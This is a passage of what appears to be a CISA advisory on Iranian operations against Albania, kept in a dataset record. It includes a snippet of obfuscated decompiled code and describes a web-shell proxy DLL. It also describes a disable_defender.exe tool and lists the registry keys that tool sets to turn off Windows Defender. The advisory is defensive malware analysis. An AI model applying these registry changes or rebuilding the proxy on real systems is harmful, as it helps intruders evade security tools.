return Umbrella\\_admit\\_arctic.rebel\\_sadreporthospital(\"460F2830272A2F2266052928202F21661627252D27212368\");\u00a0 //Invalid Config Package.\n   \n\n  \n\n }\n   \n\n  \n\n  \n\n  \n\n public static string Visual\\_math\\_already()\n   \n\n  \n\n {\n   \n\n  \n\n return Umbrella\\_admit\\_arctic.rebel\\_sadreporthospital(\"5304057E0116001607\");\u00a0\u00a0 //WV\\-RESET\n \n\n\n\n\n The method rebel\\_sadreporthospital takes the first byte of the encoded string and XOR\u2019s each subsequent byte to produce the de\\-obfuscated string.\n \n\n\n\n When run in context of an IIS web server connecting to the ASPX file will generate a 200 \\<Encryption DLL Info\\> 1\\.5 output.\n   \n\n  \n\n\n\n\n\n\n\n\n\n\n![]()\n\n\n\n\n*Initial connection* \n\n\n\n\n\n The hex string represents the following ASCII text:\n \n\n\n\n\n Base64, Version\\=1\\.0\\.0\\.0, Culture\\=neutral, PublicKeyToken\\=null\n \n\n\n\n\n Sending a POST request with a Base64 encoded IP and port will open a second socket to the supplied IP and port making this a Web proxy.\n \n\n\n\n\n\n\n\n\n![]()\n\n\n\n\n*Second Socket Opened from POST Request* \n\n\n\n\n\n Sending a request to WV\\-RESET with a value will produce an OK response and call a function to shut down the proxy socket.\n \n\n\n\n\n\n\n\n\n![]()\n\n\n\n\n*Terminate socket* \n\n\n\n\n\n The DLL extracts a secondary \u201cEncryptionDLL\u201d named Base64\\.dll which is loaded via Assembly.Load. This exposes two functions, encrypt and decrypt. This DLL is used to decrypt the Proxy IP and port along with data. In this instance the class name is misspelled Bsae64, which is also reflected in the calling DLLs decoded strings. It is uncertain as to why an additional Base64\\.dll binary is extracted when the same encoding could be hard coded in the original DLL. It is possible other versions of this tool utilize differing \u201cEncryptionDLL\u201d binaries.\n   \n\n  \n\n\n\n\n\n\n\n\n\n\n![]()\n\n\n\n\n*Misspelled Class Name* \n\n\n\n\n\n\n![]()\n\n\n\n\n*Called Misspelled Nam* \n e\n \n\n\n\n\n***File Details***\n\n\n\n\n\n| ClientBin.aspx |  |\n| --- | --- |\n| File Size | 55\\.24 KB (56561 bytes) |\n| SHA256 | 7ad64b64e0a4e510be42ba631868bbda8779139dc0daad9395ab048306cc83c5 |\n| SHA1 | e03edd9114e7a0138d1309034cad6b461ab0035b |\n| MD5 | a9fa6cfdba41c57d8094545e9b56db36 |\n| SSDeep | 768:x9TfK6nOgo5zE/cezUijAwZIFxK1mGjncrF8EAZ0iBDZBZdywb0DwHN4N4wjMxr8:x9TfdOgAi2 (Ver 1\\.1\\) |\n| Filetype | HTML document text, ASCII text, with very long lines (56458\\) |\n\n\n\n\n\n\n\n\n| App\\_Web\\_bckwssht.dll |  |\n| --- | --- |\n| File Size | 41\\.0 KB (41984 bytes) |\n| SHA256 | cad2bc224108142b5aa19d787c19df236b0d12c779273d05f9b0298a63dc1fe5 |\n| SHA1 | 49fd8de33aa0ea0c7432d62f1ddca832fab25325 |\n| MD5 | e9b6ecbf0783fa9d6981bba76d949c94 |\n| SSDeep | 384:coY4jnD7l9VAk1dtrGBlLGYEX1tah8dgNyamGOvMTfdYN5qZAsP:hlXAkHRGBlUUh8cFmpv6feYLP (Ver 1\\.1\\) |\n| Filetype | PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows |\n| PEtype | DLL |\n| PE Header Timestamp | 2021\\-06\\-07 10:37:55 |\n| ImpHash | dae02f32a21e03ce65412f6e56942daa |\n\n\n#### *Disable Defender*\n\n\n\n*Description* \n\n\n\n\n disable\\_defender.exe is a Microsoft Windows PE file that attempts to disable Windows Defender. The application will elevate privileges to that of SYSTEM and then attempt to disable Defender\u2019s core functions. A command prompt with\n *status* \n and\n *error* \n messages is displayed as the application executes. No network activity was detected during the evaluation.\n \n\n\n\n Upon execution, a command prompt is launched and a message is displayed if the process is not running as SYSTEM. The process is then restarted with the required permissions.\n \n\n\n\n\n\n\n\n\n![]()\n\n\n\n\n*Test validate permissions* \n\n\n\n\n\n The application will attempt to terminate the Windows Defender process by calling\n *TerminateProcess* \n for smartscreen.exe:\n \n\n\n\n\n\n\n\n\n![]()\n\n\n\n\n*Attempt to kill Windows Defender* \n\n\n\n\n\n The following Registry Keys were modified to disable Windows Defender:\n \n\n\n\n\n| Set Registry Values (observed Win10 1709\\) |  |\n| --- | --- |\n| HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Features\\\\TamperProtection | 0 |\n|  |  |\n| HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender\\\\DisableAntiSpyware | 1 |\n| HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\     StartupApproved\\\\Run\\\\SecurityHealth | 03 00 00 00 5D 02 00 00 41 3B 47 9D |\n| HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\DisableAntiSpyware | 1 |\n| HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\WinDefend\\\\Start | 3 |\n| HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows Defender\\\\Real\\-Time Protection\\\\     DisableRealtimeMonitoring | 1 |\n\n\n\n Upon completion and if successful the application will display the following messages and wait for user input.\n \n\n\n\n\n\n\n\n\n![]()\n\n\n\n\n*User Input* \n\n\n\n\n\n\n| disable\\-defender.exe |  |\n| --- | --- |\n| File Size | 292\\.0 KB (299008 bytes) |\n| SHA256 | 45bf0057b3121c6e444b316afafdd802d16083282d1cbfde3cdbf2a9d0915ace |\n| SHA1 | e866cc6b1507f21f688ecc2ef15a64e413743da7 |\n| MD5 | 60afb1e62ac61424a542b8c7b4d2cf01 |\n| SSDeep | 6144:t2WhikbJZc\\+Wrbe/t1zT/p03BuGJ1oh7ISCLun:t2WpZnW\\+/tVoJ1ouQ (Ver 1\\.1\\) |\n| Filetype | PE32\\+ executable (console) x86\\-64, for MS Windows |\n| PEtype | EXE |\n| PE Header Timestamp | 2021\\-10\\-24 15:07:32 |\n| ImpHash | 74a6ef9e7b49c71341e439022f643c8e |\n\n\n\n### Revisions\n\n\n\n\n September 21, 2022: Initial Version\\|September 22, 2022: Reordered items in the Mitigation Section\\|September 23, 2022: Add the STIX file\n \n\n\n\n\n\n\n\n\n\n\n This product is provided subject to this\n [Notification](/notification \"Follow link\") \n and this\n [Privacy \\& Use](/privacy-policy \"Follow link\") \n policy.\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPlease share your thoughts\n--------------------------\n\n\n\n We recently updated our anonymous\n [product survey](https://www.surveymonkey.com/r/CISA-cyber-survey?product=https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-264a) \n ; we\u2019d welcome your feedback.\n \n\n\n\n\n\n\n\n\n\n\n\n\nRelated Advisories\n------------------\n\n\n\n\n\n\n\n\n\n\n Jul 11, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-193A\n \n\n### [CISA Red Team\u2019s Operations Against a Federal Civilian Executive Branch Organization Highlights the Necessity of Defense\\-in\\-Depth](/news-events/cybersecurity-advisories/aa24-193a)\n\n\n\n\n\n\n\n\n\n\n\n Jul 08, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-190A\n \n\n### [People\u2019s Republic of China (PRC) Ministry of State Security APT40 Tradecraft in Action](/news-events/cybersecurity-advisories/aa24-190a)\n\n\n\n\n\n\n\n\n\n\n\n May 10, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-131A\n \n\n### [\\#StopRansomware: Black Basta](/news-events/cybersecurity-advisories/aa24-131a)\n\n\n\n\n\n\n\n\n\n\n\n Apr 18, 2024\n \n\n\n Cybersecurity Advisory \\| AA24\\-109A\n \n\n### [\\#StopRansomware: Akira Ransomware](/news-events/cybersecurity-advisories/aa24-109a)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Return to top](#) \n\n\n\n\n* [Topics](/topics)\n* [Spotlight](/spotlight)\n* [Resources \\& Tools](/resources-tools)\n* [News \\& Events](/news-events)\n* [Careers](/careers)\n* [About](/about)\n\n\n\n\n\n\n\n\n[Cybersecurity \\& Infrastructure Security Agency](/ \"Go to the Cybersecurity & Infrastructure Security Agency homepage\")\n\n\n* [Facebook](https://www.facebook.com/CISA)\n* [Twitter](https://twitter.com/CISAgov)\n* [LinkedIn](https://www.linkedin.com/company/cybersecurity-and-infrastructure-security-agency)\n* [YouTube](https://www.youtube.com/@cisagov)\n* [Instagram](https://www.instagram.com/cisagov)\n* [RSS](/subscribe-updates-cisa)\n\n\n\n\n CISA Central\n \n[1\\-844\\-Say\\-CISA](tel:1-844-Say-CISA) \n[SayCISA@cisa.gov](mailto:SayCISA@cisa.gov) \n\n\n\n\n\n\n\n\n\n\n\n DHS Seal\n \n\n\n CISA.gov\n \n\n An official website of the U.S. Department of Homeland Security\n \n\n\n* [About CISA](/about \"About CISA\")\n* [Budget and Performance](https://www.dhs.gov/performance-financial-reports \"Budget and Performance\")\n* [DHS.gov](https://www.dhs.gov \"Department of Homeland Security\")\n* [Equal Opportunity \\& Accessibility](/oedia \"Equal Opportunity & Accessibility\")\n* [FOIA Requests](https://www.dhs.gov/foia \"FOIA Requests\")\n* [No FEAR Act](/no-fear-act \"No FEAR Act Reporting\")\n* [Office of Inspector General](https://www.oig.dhs.gov/ \"Office of Inspector General\")\n* [Privacy Policy](/privacy-policy \"Privacy Policy\")\n* [Subscribe](https://public.govdelivery.com/accounts/USDHSCISA/subscriber/new?topic_id=USDHSCISA_138 \"Subscribe to Email Updates\")\n* [The White House](https://www.whitehouse.gov/ \"The White House\")\n* [USA.gov](https://www.usa.gov/ \"USA.gov\")\n* [Website Feedback](/forms/feedback \"Website Feedback\")\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", "cves": ["CVE-2019-0604"], "techniques": [], "advisory": "aa22-264a", "title": "Iranian State Actors Conduct Cyber Operations Against the Government of Albania | CISA", "source": "cybersecurity-advisories", "id": "ba52a7e6e2d79cbe1f3373b7f1493a5479393fdac4367a466e5c681aea4eacee"}